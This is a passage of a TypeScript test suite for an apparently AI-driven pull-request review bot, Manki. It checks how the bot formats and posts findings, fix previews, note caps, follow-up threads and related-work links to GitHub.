    expect(fold('One line')).toContain('**How to fix it**\n```diff\n-  return retry(fn);\n+  return retry(fn, 3);\n```');
    expect(fold('One line')).not.toContain('src/a.ts#L39-L43');
    expect(fold('Two lines')).toContain('**How to fix it**\n```diff\n-  const out = `a` + b;\n+  const head = `a`;\n+  const out = head + b;\n```');
    // A fix over ten changed lines, or one whose flagged line was not read, keeps its code block and the preview.
    expect(fold('Too long')).toContain(`**How to fix it**\n\`\`\`ts\n${longFix}\n\`\`\``);
    expect(fold('Too long')).toContain('https://github.com/owner/repo/blob/abc1234/src/a.ts#L42-L46');
    expect(fold('Past the end')).toContain('**How to fix it**\n```ts\nx();\n```');
    // So does one whose flagged line is too long for the body, such as a line of a minified file.
    expect(fold('Minified')).toContain('**How to fix it**\n```ts\nconst data = load();\n```');
    expect(fold('Minified')).not.toContain('x'.repeat(700));
    expect(fold('In prose')).toContain('**How to fix it**\nHandle the `None` case separately.');
    expect(fold('In prose')).toContain('https://github.com/owner/repo/blob/abc1234/src/a.ts#L43-L47');
    // A fence run in the code gets a longer fence around the diff.
    expect(fold('Fence in code')).toContain('**How to fix it**\n````diff\n-const fence = "```";\n+const fence = "~~~";\n````');
    expect(body).not.toContain('\r');
  });

  it('previews the code each check cites inside its file, also in an inline comment', async () => {
    const { octokit, createReview, getContent } = makeOctokit({ 'src/b.ts': 'one\ntwo\nthree\n', 'Makefile': 'all:\n\tbuild\n' });

    // A file name no changed file has is read at the repository root, and stays text when no file is there.
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', buildResult([
      nonBlocking('warning', 'Extract helper', 5, { tags: ['follow-up'], evidence: { checks: ['src/b.ts:3 ends the helper', 'Makefile:2 runs the build', 'helpers.py:9 retries forever'], proof: [] } }),
    ]), diff);

    expect(getContent).toHaveBeenCalledWith(expect.objectContaining({ path: 'src/b.ts', ref: 'abc1234' }));
    expect(getContent).toHaveBeenCalledWith(expect.objectContaining({ path: 'helpers.py', ref: 'abc1234' }));
    expect(createReview.mock.calls[0][0].comments[0].body).toContain([
      '<summary>How this was checked: 2 places read, 1 other check</summary>',
      '',
      'Ends the helper',
      'https://github.com/owner/repo/blob/abc1234/src/b.ts#L2-L3',
      '',
      'Runs the build',
      'https://github.com/owner/repo/blob/abc1234/Makefile#L1-L2',
      '',
      '- helpers.py:9 retries forever',
      '',
      '</details>',
    ].join('\n'));

    // Evidence can cite many paths, so only the first 20 get their length looked up, besides the finding's own file.
    getContent.mockClear();
    const many = Array.from({ length: 25 }, (_, i) => `src/f${i}.ts:1 is read`);
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', buildResult([nonBlocking('note', 'Extract helper', 5, { evidence: { checks: many, proof: [] } })]), diff);
    expect(getContent).toHaveBeenCalledTimes(21);
  });

  it('lists every note in one collapsed section in the order given, never inline, and keeps a thread for a security finding', async () => {
    const { octokit, createReview, createReviewComment } = makeOctokit();

    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', buildResult([
      nonBlocking('note', 'Typo in name', 7),
      nonBlocking('note', 'Extract helper', 5, { suggestedFix: 'const x = helper();' }),
      nonBlocking('note', 'Token compared in variable time', 9, { tags: ['security'] }),
      nonBlocking('note', 'Missing file context', 0, { file: '', suggestedFix: 'Use the shared helper.', checkStatus: 'unconfirmed' }),
      nonBlocking('note', 'Off the diff', 40, { howToFix: 'Run `b` only when `a` holds.', suggestedFix: 'if (a) {\n  b();\n}', evidence: { checks: ['read src/a.ts:40'], proof: [] }, checkStatus: 'proven' }),
    ]), diff);

    const review = createReview.mock.calls[0][0];
    expect(createReviewComment).not.toHaveBeenCalled();
    expect(review.comments.map((c: { line: number }) => c.line)).toEqual([9]);
    expect(review.comments[0].body).toMatch(/^\u2728 \*\*Note, not blocking\*\*[^\n]*\n\n\*\*Token compared in variable time\*\*\n\n\*\*Why:\*\* It goes wrong\./u);
    expect(review.comments[0].body).toContain('<!-- manki:note:Token-compared-in-variable-time -->');
    expect(review.body).not.toContain('### Findings');
    // The section opens with the first note, and a note's code fix is a code block in its fold.
    expect(review.body).toContain([
      '<details>',
      '<summary><b>4 notes</b> · not blocking</summary>',
      '',
      '<details>',
      '<summary>\u2728 <b>Typo in name</b><br><sub><b>Note, not blocking</b> · <a href="https://github.com/owner/repo/blob/abc1234/src/a.ts#L7"><code>src/a.ts:7</code></a></sub></summary>',
    ].join('\n'));
    expect(review.body).toContain('<summary>\u2728 <b>Extract helper</b><br><sub><b>Note, not blocking</b> · <a href="https://github.com/owner/repo/blob/abc1234/src/a.ts#L5"><code>src/a.ts:5</code></a></sub></summary>\n\n**Why:** It goes wrong. Second sentence. Third sentence.\n\nhttps://github.com/owner/repo/blob/abc1234/src/a.ts#L3-L5\n\n**How to fix it**\n```ts\nconst x = helper();\n```\n\n</details>');
    // A fold shows the whole description and a preview of the flagged lines, then the fix and the checks under their labels.
    expect(review.body).toContain([
      '<details>',
      '<summary>\u2728 <b>Missing file context</b><br><sub><b>Note, not blocking</b></sub></summary>',
      '',
      '_Manki could not confirm this, so please check it._',
      '',
      '**Why:** It goes wrong. Second sentence. Third sentence.',
      '',
      '**How to fix it**',
      'Use the shared helper.',
      '',
      // A finding listed in the body names its check status in a line of its own, after the fix.
      '**How this was checked:** not confirmed',
      '',
      '</details>',
      '',
      '<!-- manki-issue-box -->',
      '- [ ] Create an issue for this <!-- manki-box:issue::0:13b2ce8dbe6c -->',
      '',
      '<details>',
      '<summary>\u2728 <b>Off the diff</b><br><sub><b>Note, not blocking</b> · <a href="https://github.com/owner/repo/blob/abc1234/src/a.ts#L40"><code>src/a.ts:40</code></a></sub></summary>',
      '',
      '**Why:** It goes wrong. Second sentence. Third sentence.',
      '',
      'https://github.com/owner/repo/blob/abc1234/src/a.ts#L38-L40',
      '',
      '**How to fix it**',
      'Run `b` only when `a` holds.',
      '',
      '```ts',
      'if (a) {',
      '  b();',
      '}',
      '```',
      '',
      '**How this was checked:** proven from the cited lines',
      '',
      '**Checked in the code**',
      '- Read `src/a.ts`:40',
      '',
      '</details>',
      '',
      '<!-- manki-issue-box -->',
      '- [ ] Create an issue for this <!-- manki-box:issue:src/a.ts:40:dbf7a9628065 -->',
      '',
      '</details>',
    ].join('\n'));
    expect(review.body).not.toContain('not listed');

    // A line says how many notes are over the limit, under the listed notes or alone when the review lists none.
    const leftOut = [nonBlocking('note', 'Left out', 11, { unpostedReason: 'note_cap' }), nonBlocking('note', 'Also left out', 12, { unpostedReason: 'note_cap' })];
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([nonBlocking('note', 'Typo in name', 7)]), unposted: leftOut }, diff);
    // A note left out for another reason is not counted.
    const seen = [nonBlocking('note', 'Reviewed', 13, { unpostedReason: 'reviewed_code' }), nonBlocking('note', 'Listed', 14, { unpostedReason: 'listed_earlier' })];
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([nonBlocking('note', 'Typo in name', 7)]), unposted: [leftOut[0], ...seen] }, diff);
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([]), unposted: [leftOut[0], ...seen] }, diff);
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([]), unposted: leftOut }, diff);
    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([]), unposted: seen }, diff);
    const [, under, underOne, alone, aloneMany, uncapped] = createReview.mock.calls.map(call => call[0].body as string);
    expect(under).toMatch(/ -->\n\n<\/details>\n\n<sub>2 more notes are not listed\.<\/sub>/);
    expect(underOne).toContain('</details>\n\n<sub>1 more note is not listed.</sub>');
    expect(alone).toMatch(/^Summary\n\n---\n\n<sub>1 note is not listed\.<\/sub>/);
    expect(aloneMany).toMatch(/^Summary\n\n---\n\n<sub>2 notes are not listed\.<\/sub>/);
    expect(uncapped).not.toContain('not listed');
    expect(`${under}${alone}`).not.toContain('Left out');
    expect(review.body).not.toContain('not listed');
  });

  it('lists what the round checked and left out in one fold at the end of the body', async () => {
    const { octokit, createReview } = makeOctokit();
    const bodyOf = async (result: Partial<ReviewResult>, disproved: DisprovedFinding[] = []): Promise<string> => {
      await postReview(octokit, 'owner', 'repo', 1, 'abc1234', { ...buildResult([]), ...result }, diff, undefined, undefined, { disproved });
      return createReview.mock.calls.at(-1)![0].body;
    };
    const link = (line: number, file = 'src/a.ts'): string => `[\`${file}:${line}\`](https://github.com/owner/repo/blob/abc1234/${file}#L${line})`;
    const unproven = [nonBlocking('warning', 'Unsettled', 15, { unpostedReason: 'unsettled_check' }), nonBlocking('warning', 'Unchecked', 16, { unpostedReason: 'not_checked' }), nonBlocking('warning', 'Uncited', 17, { unpostedReason: 'no_proof' })];
    const capped = nonBlocking('note', 'Left out', 11, { unpostedReason: 'note_cap' });
    // Of the findings on code the PR did not change, the fold lists the warnings, which no check confirmed.
    const unpostedPreExisting = [nonBlocking('warning', 'Old loop', 18), nonBlocking('note', 'Old name', 19)];
    const leads = [nonBlocking('warning', 'Token may not read it', 3, { leadSince: 2 }), nonBlocking('note', 'Cache <b>may</b> go stale', 4)];
    const overflow = { title: 'Overflow', file: 'src/m.ts', line: 2, reason: 'Checked at <i>src/api.ts:3</i>.\nBoth inputs are bounded. A third sentence stays in the log.' };
    const log = '<sub>The progress comment has the full log under "Judge decisions", in its "Review metadata" fold.</sub>';

    // Every kind has its heading and count, and the summary gives the total and the split.
    const all = await bodyOf({ unposted: [...unproven, capped], unpostedPreExisting, openLeads: leads }, [overflow]);
    expect(all).toContain([
      'Summary',
      '',
      '---',
      '',
      '<sub>1 note is not listed.</sub>',
      '',
      '---',
      '',
      '<details>',
      '<summary>Checked and left out: 7 findings (1 disproved, 4 unproven, 2 not finished)</summary>',
      '',
      '#### Disproved by a tool check · 1 finding',
      '',
      `- **Overflow** · ${link(2, 'src/m.ts')}`,
      '  Checked at src/api.ts:3. Both inputs are bounded.',
      '',
      '#### Not proven, so not listed · 4 warnings',
      '',
      `- **Unsettled** · ${link(15)}`,
      '  A tool check could not confirm it.',
      `- **Unchecked** · ${link(16)}`,
      '  Nothing proves it and no tool check ran on it.',
      `- **Uncited** · ${link(17)}`,
      '  It cites no lines that prove it.',
      `- **Old loop** · ${link(18)}`,
      '  On code this PR did not change, and no tool check confirmed it.',
      '',
      '#### Not finished checking · 2 leads',
      '',
      `- **Token may not read it** · ${link(3)}`,
      '  Open since round 2.',
      `- **Cache may go stale** · ${link(4)}`,
      '',
      log,
      '',
      '</details>',
      '',
      '<details>',
      '<summary>About this review</summary>',
    ].join('\n'));

    // One kind needs no split, and a kind with no entries has no heading.
    const one = await bodyOf({}, [overflow]);
    expect(one).toContain(`<summary>Checked and left out: 1 finding</summary>\n\n#### Disproved by a tool check · 1 finding\n\n- **Overflow** · ${link(2, 'src/m.ts')}\n  Checked at src/api.ts:3. Both inputs are bounded.\n\n${log}\n\n</details>`);
    expect(one).not.toMatch(/Not proven|Not finished/);
    expect(await bodyOf({ unposted: unproven.slice(0, 1), openLeads: leads.slice(0, 1) })).toContain('<summary>Checked and left out: 2 findings (1 unproven, 1 not finished)</summary>');
    // The judge never saw a lead that was only listed, so a fold of leads names no log.
    const leadsOnly = await bodyOf({ openLeads: leads });
    expect(leadsOnly).toContain('<summary>Checked and left out: 2 findings</summary>');
    expect(leadsOnly).not.toContain('Judge decisions');

    // Each kind lists its first ten. A reason ends at its second sentence, or its first when two pass 300 characters.
    const many = Array.from({ length: 12 }, (_, i) => ({ title: `Finding ${i}`, file: 'src/`a`.ts', line: i + 1, reason: `${'Long reason. '.repeat(i === 0 ? 1 : 0)}${'x'.repeat(290)}. More than fits here.` }));
    const long = await bodyOf({}, [...many, { title: 'No file', file: '', line: 0, reason: `${'y'.repeat(400)}. More.` }]);
    expect(long).toContain(`#### Disproved by a tool check · 13 findings\n\n- **Finding 0** · [\`src/'a'.ts:1\`](https://github.com/owner/repo/blob/abc1234/src/%60a%60.ts#L1)\n  Long reason.\n- **Finding 1** · `);
    expect(long).toContain(`#L2)\n  ${'x'.repeat(290)}.\n- **Finding 2**`);
    expect(long).toMatch(/- \*\*Finding 9\*\* [^\n]+\n {2}x+\.\n\n<sub>and 3 more<\/sub>\n\n<sub>The progress comment/);
    expect(await bodyOf({}, [{ title: 'No file', file: '', line: 0, reason: `${'y'.repeat(400)}. More.` }])).toContain(`- **No file**\n  ${'y'.repeat(300)}...\n\n`);

    // An incomplete round's progress comment has no judge decisions, so its review has no fold. Neither has a round that left nothing out.
    expect(await bodyOf({ reviewComplete: false, unposted: unproven, openLeads: leads }, [overflow])).not.toContain('Checked and left out');
    expect(await bodyOf({ unposted: [capped], unpostedPreExisting: unpostedPreExisting.slice(1) })).not.toContain('Checked and left out');
    // A warning on unchanged code is the judge's decision too, so a fold of those alone names the log.
    expect(await bodyOf({ unpostedPreExisting })).toContain(`<summary>Checked and left out: 1 finding</summary>\n\n#### Not proven, so not listed · 1 warning\n\n- **Old loop** · ${link(18)}\n  On code this PR did not change, and no tool check confirmed it.\n\n${log}\n\n</details>`);
  });

  it('posts at most five non-blocking findings inline, most severe first, and lists the rest', async () => {
    const { octokit, createReview } = makeOctokit();

    const deferred = (title: string, line: number): Finding => nonBlocking('warning', title, line, { tags: ['follow-up'] });
    await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([
      nonBlocking('note', 'Nit one', 1),
      nonBlocking('note', 'Unescaped path in a log line', 2, { tags: ['security'] }),
      deferred('Deferred warning', 3),
      deferred('Warning two', 4),
      nonBlocking('note', 'Suggestion one', 5),
      deferred('Warning three', 6),
      deferred('Warning four', 8),
      deferred('Warning five', 9),
    ]), diff);

    const review = createReview.mock.calls[0][0];
    const byLine = new Map(review.comments.map((c: { line: number; body: string }) => [c.line, c.body]));
    expect([...byLine.keys()].sort()).toEqual([3, 4, 6, 8, 9]);
    expect(byLine.get(3)).toMatch(/^\u26A0\uFE0F \*\*Warning, not blocking\*\*\n\n\*\*Deferred warning\*\*\n/u);
    expect(byLine.get(3)).toContain('<!-- manki:warning:Deferred-warning -->');
    expect(review.body).toContain('### Findings · 1 note\n\n<details>\n<summary>\u2728 <b>Unescaped path in a log line</b>');
    expect(review.body).toContain('<summary><b>2 notes</b> · not blocking</summary>\n\n<details>\n<summary>\u2728 <b>Nit one</b>');
  });

  it('previews the flagged line with two lines each side at the reviewed commit, kept inside the file', async () => {
    const { octokit, createReview, getContent } = makeOctokit({ 'src/a.ts': 'x\n'.repeat(41), 'src/c.ts': `${'x'.repeat(60_000)}\n`.repeat(10) });

    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', buildResult([
      nonBlocking('note', 'Near the end of `Vec<u8>`\n\n& co', 40),
      nonBlocking('note', 'Past the end', 50),
      nonBlocking('note', 'At the top', 1, { file: 'src/c.ts' }),
    ]), diff);

    const { body } = createReview.mock.calls[0][0];
    expect(getContent).toHaveBeenCalledWith(expect.objectContaining({ path: 'src/a.ts', ref: 'abc1234' }));
    expect(body).toContain('<summary>\u2728 <b>Near the end of <code>Vec&lt;u8&gt;</code> &amp; co</b>');
    expect(body).toContain('\n\nhttps://github.com/owner/repo/blob/abc1234/src/a.ts#L38-L41\n\n</details>\n\n<!-- manki-issue-box -->');
    expect(body).toContain('\n\nhttps://github.com/owner/repo/blob/abc1234/src/c.ts#L1-L3\n\n</details>\n\n<!-- manki-issue-box -->');
    expect(body).not.toContain('#L48');
    expect(body).toContain('<b>Past the end</b>');
  });

  it('keeps the first notes in the judge\'s order and moves the others to the record as `note_cap`, never a warning, a security finding, a tool alert or a note a thread carries', () => {
    const existingThreads = [{ title: 'In a thread', file: 'src/a.ts', line: 5, severity: 'note' as const, status: 'open' as const, threadId: 'T1', markerSlug: 'In-a-thread' }];
    const findings = [
      nonBlocking('note', 'Note one', 1),
      nonBlocking('warning', 'Deferred warning', 2, { tags: ['follow-up'] }),
      nonBlocking('note', 'In a thread', 5, { noteRank: 0 }),
      nonBlocking('note', 'Restates a thread', 6, { threadId: 'T9' }),
      nonBlocking('note', 'Note two', 7),
      nonBlocking('note', 'Token compared in variable time', 8, { tags: ['security'] }),
      nonBlocking('note', 'Note three', 9),
      nonBlocking('note', 'Note four', 10),
      nonBlocking('note', 'Note five', 11),
    ];
    const titles = (list: Finding[] = []) => list.map(f => f.title);
    const others = ['Deferred warning', 'In a thread', 'Restates a thread', 'Token compared in variable time'];
    const hidden = nonBlocking('note', 'Hidden by another rule', 90);

    // Without an order from the judge, the notes keep the order they came in.
    const unranked: ReviewResult = { ...buildResult([...findings]), unposted: [hidden] };
    capNotes(unranked, existingThreads);
    expect(titles(unranked.findings)).toEqual([...others, 'Note one', 'Note two', 'Note three']);
    expect(unranked.unposted).toEqual([hidden, { ...findings[7], unpostedReason: 'note_cap' }, { ...findings[8], unpostedReason: 'note_cap' }]);

    // The judge's order decides which notes are listed. A note it did not rank comes after the ranked ones.
    const ranks: Record<string, number> = { 'Note five': 0, 'Note three': 1, 'Deferred warning': 2, 'Note one': 4 };
    const ranked = buildResult(findings.map(f => (f.title in ranks ? { ...f, noteRank: ranks[f.title] } : f)));
    capNotes(ranked, existingThreads);
    expect(titles(ranked.findings)).toEqual([...others, 'Note five', 'Note three', 'Note one']);
    expect(titles(ranked.unposted)).toEqual(['Note two', 'Note four']);

    const none = buildResult([...findings]);
    capNotes(none, existingThreads, 0);
    expect(titles(none.findings)).toEqual(others);
    expect(titles(none.unposted)).toEqual(['Note one', 'Note two', 'Note three', 'Note four', 'Note five']);

    const all = buildResult([...findings]);
    capNotes(all, existingThreads, 5);
    expect(titles(all.findings)).toEqual([...others, 'Note one', 'Note two', 'Note three', 'Note four', 'Note five']);
    expect(all.unposted).toBeUndefined();

    // A tool alert is listed in the judge's order with the notes, takes no place and is never left out.
    const alerts = [nonBlocking('note', 'Unused import', 12, { toolSource: 'eslint', noteRank: 2 }), nonBlocking('note', 'Shadowed name', 13, { toolSource: 'eslint' })];
    const withAlerts = buildResult([alerts[0], ...findings.map(f => (f.title in ranks ? { ...f, noteRank: ranks[f.title] } : f)), alerts[1]]);
    capNotes(withAlerts, existingThreads, 2);
    expect(titles(withAlerts.findings)).toEqual([...others, 'Note five', 'Note three', 'Unused import', 'Shadowed name']);
    expect(titles(withAlerts.unposted)).toEqual(['Note one', 'Note two', 'Note four']);
    const onlyAlerts = buildResult([...alerts, ...findings]);
    capNotes(onlyAlerts, existingThreads, 0);
    expect(titles(onlyAlerts.findings)).toEqual([...others, 'Unused import', 'Shadowed name']);
  });

  it('does not post a non-blocking finding again while its open thread carries it, or when it repeats an answered thread', async () => {
    const { octokit, createReview } = makeOctokit();
    // `Fallback line` was posted on line 1 because its line was outside that round's diff.
    const existingThreads = [
      { title: 'Extract helper', file: 'src/a.ts', line: 5, severity: 'note' as const, status: 'open' as const, threadId: 'T1', markerSlug: 'Extract-helper' },
      { title: 'Fallback line', file: 'src/a.ts', line: 1, findingLine: 30, severity: 'note' as const, status: 'open' as const, threadId: 'T3', markerSlug: 'Fallback-line' },
      { title: 'Retry leaks a timer', file: 'src/a.ts', line: 7, severity: 'warning' as const, status: 'open' as const, threadId: 'T4', markerSlug: 'Retry-leaks-a-timer' },
    ];

    const findings = [
      nonBlocking('note', 'Extract helper', 5),
      nonBlocking('note', 'Fallback line', 30),
      nonBlocking('note', 'Worse retry', 11, { answeredIn: { threadId: 'T2', answer: 'Withdrawn. Fine.' } }),
      // A warning on code an earlier round reviewed opens no second thread either.
      nonBlocking('warning', 'Retry leaks a timer', 7, { origin: 'reviewed', tags: ['follow-up'] }),
    ];
    // The record entry of the answered thread's finding has its thread already, as `buildRoundContext` writes it.
    const context = makeContext({
      findings: { count: findings.length, severityCounts: {}, entries: findings.map(f => ({ fingerprint: { file: f.file, lineStart: f.line, lineEnd: f.line, slug: titleToSlug(f.title) }, severity: f.severity, ...(f.answeredIn && { threadId: f.answeredIn.threadId }) })) },
    });
    await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult(findings), diff, context, undefined, { existingThreads });

    const review = createReview.mock.calls[0][0];
    expect(review.comments).toEqual([]);
    const visible = (review.body as string).slice(0, review.body.indexOf('<!-- manki-stats'));
    expect(visible).not.toContain('Extract helper');
    expect(visible).not.toContain('Fallback line');
    expect(visible).not.toContain('Worse retry');
    expect(visible).not.toContain('Retry leaks a timer');
    // The record says which thread carries each finding.
    const record = JSON.parse(extractReviewRecords(review.body as string).records[0]) as RoundContext;
    expect(record.findings.entries.map(e => [e.posted, e.threadId])).toEqual([['earlier_thread', 'T1'], ['earlier_thread', 'T3'], ['earlier_thread', 'T2'], ['earlier_thread', 'T4']]);
  });

  it('lists the findings of closed threads Manki agreed to leave for later as follow-ups', async () => {
    const { octokit, createReview, getContent } = makeOctokit({ 'src/b.ts': 'x\n'.repeat(20) });
    const thread = (title: string, extra: Partial<PreviousFinding>): PreviousFinding => ({
      title, file: 'src/b.ts', line: 9, severity: 'warning', status: 'auto-resolved', threadId: `T-${title}`, description: 'Retries forever.', answer: 'Agreed. Later is fine.', ...extra,
    });

    await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([]), diff, undefined, undefined, { existingThreads: [
      thread('Retry has no limit', { suggestedFix: 'Cap the retries.' }),
      thread('Human closed', { status: 'resolved', answer: '**Agreed.** Later.', howToFix: 'Add a retry limit' }),
      thread('Still open', { status: 'open' }),
      thread('Fixed since', { status: 'resolved', fixed: true }),
      thread('Withdrawn one', { answer: 'Withdrawn. Fine.' }),
      thread('Agreed then kept', { answer: 'Kept. `src/b.ts:3` still loops.' }),
      thread('No marker', { severity: 'unknown' }),
    ] });

    const { body } = createReview.mock.calls[0][0];
    expect(getContent).toHaveBeenCalledWith(expect.objectContaining({ path: 'src/b.ts' }));
    expect(body).toContain('#### \u{1F4CC} 2 follow-ups agreed for later\n\n<sub>Agreed in their threads as later work. None of them blocks.</sub>\n\n<details>\n<summary>\u26A0\uFE0F <b>Retry has no limit</b>');
    expect(body).toContain('Retries forever.');
    expect(body).toContain('https://github.com/owner/repo/blob/sha/src/b.ts#L7-L11');
    expect(body).toContain('<b>Human closed</b>');
    // A fix given in words stays words, never a diff against the flagged line.
    expect(body).toContain('**How to fix it**\nAdd a retry limit\n');
    expect(body).not.toContain('+Add a retry limit');
    for (const title of ['Still open', 'Fixed since', 'Withdrawn one', 'Agreed then kept', 'No marker']) expect(body).not.toContain(title);
  });

  it('notes the related open PRs and issues, most telling first, with their titles neutralized and no model reason, and keeps the approval', async () => {
    const { octokit, createReview } = makeOctokit();
    const result: ReviewResult = {
      ...buildResult([]),
      relatedWork: {
        items: [
          { kind: 'pr', number: 21, title: 'Touches [the] parser', excerpt: '', sharedFiles: 1, relation: 'overlapping' },
          { kind: 'issue', number: 42, title: 'Ping @alice, see [docs](https://evil.example)', excerpt: '', relation: 'fixes_issue', reason: 'Resolves it, cc @bob.' },
          { kind: 'pr', number: 20, title: 'Same change', excerpt: '', sharedFiles: 2, draft: true, relation: 'duplicate', reason: 'Both add the note.' },
          { kind: 'pr', number: 22, title: 'Unrelated one', excerpt: '', relation: 'unrelated' },
          { kind: 'issue', number: 44, title: 'Ends in a backslash \\', excerpt: '', relation: 'overlapping' },
          { kind: 'issue', number: 43, title: 'Never classified', excerpt: '' },
        ],
      },
    };

    await postReview(octokit, 'owner', 'repo', 1, 'sha', result, diff);

    const review = createReview.mock.calls[0][0];
    expect(review.event).toBe('APPROVE');
    expect(review.comments).toEqual([]);
    expect(review.body).toContain([
      '**Related work:** open PRs and issues that may cover the same change. None of them blocks.',
      '',
      '- Duplicate · [#20 Same change](https://github.com/owner/repo/pull/20) (draft)',
      '- Fixed here, not linked · [#42 Ping @\u200Balice, see docs](https://github.com/owner/repo/issues/42)',
      '- Overlaps · [#21 Touches \\[the\\] parser](https://github.com/owner/repo/pull/21)',
      '- Overlaps · [#44 Ends in a backslash \\\\](https://github.com/owner/repo/issues/44)',
    ].join('\n'));
    expect(review.body).not.toContain('Resolves it');
    expect(review.body).not.toContain('Unrelated one');
    expect(review.body).not.toContain('Never classified');

    await postReview(octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([]), relatedWork: { items: [result.relatedWork!.items[3]] } }, diff);
    expect(createReview.mock.calls[1][0].body).not.toContain('Related work');
  });

  it('formats the reply to an answered thread whose problem came back worse', () => {
    expect(formatFoundAgainReply([nonBlocking('warning', 'Retry has no `limit`', 11, { description: 'It retries forever.', suggestedFix: 'Cap it.' })]).split('\n\n')).toEqual([
      'This came up again, and the code here is worse than when this thread was answered.',
      expect.stringContaining('**Warning'),
      '**Retry has no `limit`**',
      '**What goes wrong:** It retries forever.',
      '**Fix:**',
      '```ts\nCap it.\n```',
    ]);
    // An open thread gets the other instances of its problem in one reply.
    const variant = nonBlocking('warning', 'The filter misses `pending`', 11, { description: 'A pending entry survives.' });
    expect(formatVariantReply([variant]).split('\n\n')).toEqual([
      'This round found another instance of this problem.',
      expect.stringContaining('**Warning'),
      '**The filter misses `pending`**',
      '**What goes wrong:** A pending entry survives.',
    ]);
    expect(formatVariantReply([variant, { ...variant, title: 'The filter misses `queued`' }]).split('\n\n')).toEqual([
      'This round found 2 more instances of this problem.',
      expect.stringContaining('**Warning'),
      '**The filter misses `pending`**',
      '**What goes wrong:** A pending entry survives.',
      '---',
      expect.stringContaining('**Warning'),
      '**The filter misses `queued`**',
      '**What goes wrong:** A pending entry survives.',
    ]);
    // A blocker that restates a thread that does not block yet says the thread blocks now.
    expect(formatRaisedReply([variant, { ...variant, severity: 'blocker' }]).split('\n\n').slice(0, 3)).toEqual([
      'This round raises this problem again as a blocker, so this thread now blocks.',
      expect.stringContaining('**Warning'),
      '**The filter misses `pending`**',
    ]);
    // Below blocker, it names the grade and says nothing about blocking.
    expect(formatRaisedReply([variant]).split('\n\n')[0]).toBe('This round raises this problem again as a warning.');
  });

  it('lists smaller findings by where they sit, found this round, missed earlier or pre-existing, and posts a warning or a blocker on reviewed code inline', async () => {
    const { octokit, createReview } = makeOctokit();
    const missedNote = '_An earlier round already reviewed these lines and missed this, and it doesn\'t block this PR._';
    const unconfirmedNote = '_Manki could not confirm this, so please check it._';
    const guideNote = '_The review model wrote these steps. Check what a step runs before you follow it._';
    // The PR quotes Manki's own notes, as a PR on Manki does. The first and last word of each are then identifiers of
    // the diff with their underscore, which the posted text must not show as code.
    const quoting: ParsedDiff = { ...diff, files: [...diff.files, { path: 'src/notes.ts', changeType: 'added', hunks: [{ oldStart: 0, oldLines: 0, newStart: 1, newLines: 1, content: `+const NOTES = '${missedNote} ${unconfirmedNote} ${guideNote}';` }] }] };
    expect([...codeTokensFromDiff(quoting)]).toEqual(expect.arrayContaining(['_An', 'PR._', '_Manki', 'it._', '_The']));

    await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([
      nonBlocking('warning', 'On new code', 11, { origin: 'new', tags: ['follow-up'] }),
      nonBlocking('warning', 'On old code', 3, { origin: 'reviewed', tags: ['follow-up'], checkStatus: 'unconfirmed' }),
      nonBlocking('warning', 'Old code off the diff', 40, { origin: 'reviewed', tags: ['follow-up'], checkStatus: 'unconfirmed' }),
      nonBlocking('note', 'Untouched file', 3, { file: 'src/b.ts', origin: 'reviewed', tags: ['security'] }),
      nonBlocking('note', 'Token logged on old code', 5, { origin: 'reviewed', tags: ['security'] }),
      nonBlocking('note', 'Note on old code', 4, { origin: 'reviewed' }),
      nonBlocking('blocker', 'Old blocker', 3, { origin: 'reviewed' }),
      // A blocker on code the PR did not change, lowered to a warning without the follow-up tag a verdict reader blocker lacks.
      nonBlocking('warning', 'Old race in the pool', 90, { origin: 'reviewed', tags: ['pre-existing'], originalSeverity: 'blocker' }),
    ]), quoting);

    const review = createReview.mock.calls[0][0];
    // A warning on reviewed code gets its thread like one on new code, and says under its title why it comes late. Each
    // note is posted as written, so the next round reads the description without them.
    const threads: string[] = review.comments.map((c: { body: string }) => c.body);
    expect(threads.map(body => body.split('\n')[2])).toEqual(['**Old blocker**', '**On new code**', '**On old code**']);
    expect(threads[2].startsWith(`\u26A0\uFE0F **Warning, not blocking**\n\n**On old code**\n\n${unconfirmedNote}\n\n${missedNote}\n\n**What goes wrong:** It goes wrong.`)).toBe(true);
    expect(parseFindingFromComment(threads[2]).description).toBe('It goes wrong. Second sentence. Third sentence.');
    expect(threads.slice(0, 2).join('\n')).not.toContain('An earlier round');
    expect(review.body).toContain(`<code>src/a.ts:40</code></a></sub></summary>\n\n${unconfirmedNote}\n\n**What goes wrong:** It goes wrong.`);
    // Each origin gets its section with exact counts, and the sections follow each other under rules. The late warning
    // no line comment can hold stays listed, and so does a security note on reviewed code.
    expect(review.body).toContain('### Missed by an earlier review · 1 warning and 2 notes\n\nThese sit on lines an earlier round already reviewed, so none of them block this PR.\n\n<details>\n<summary>\u26A0\uFE0F <b>Old code off the diff</b><br><sub><b>Warning, not blocking</b> · <a ');
    expect(review.body).toContain('<summary>\u2728 <b>Untouched file</b><br><sub><b>Note, not blocking</b> · <a href="https://github.com/owner/repo/blob/sha/src/b.ts#L3"><code>src/b.ts:3</code></a>');
    expect(review.body).toContain('<summary>\u2728 <b>Token logged on old code</b>');
    expect(review.body).not.toContain('On old code</b>');
    // A note sits in the notes section whatever code it is on.
    expect(review.body).toMatch(/### Pre-existing[\s\S]*\n\n---\n\n<details>\n<summary><b>1 note<\/b> · not blocking<\/summary>\n\n<details>\n<summary>\u2728 <b>Note on old code<\/b>/u);
    expect(review.body).toMatch(/\n\n---\n\n### Pre-existing · 1 warning\n\nIt sits on code this PR did not change, so it doesn't block\. If it is a blocker, it is listed as a warning\.\n\n<details>\n<summary>\u26A0\uFE0F <b>Old race in the pool<\/b><br><sub><b>Warning, not blocking<\/b> · Pre-existing · <a /u);
    expect(review.body.indexOf('Missed by an earlier review')).toBeLessThan(review.body.indexOf('### Pre-existing'));
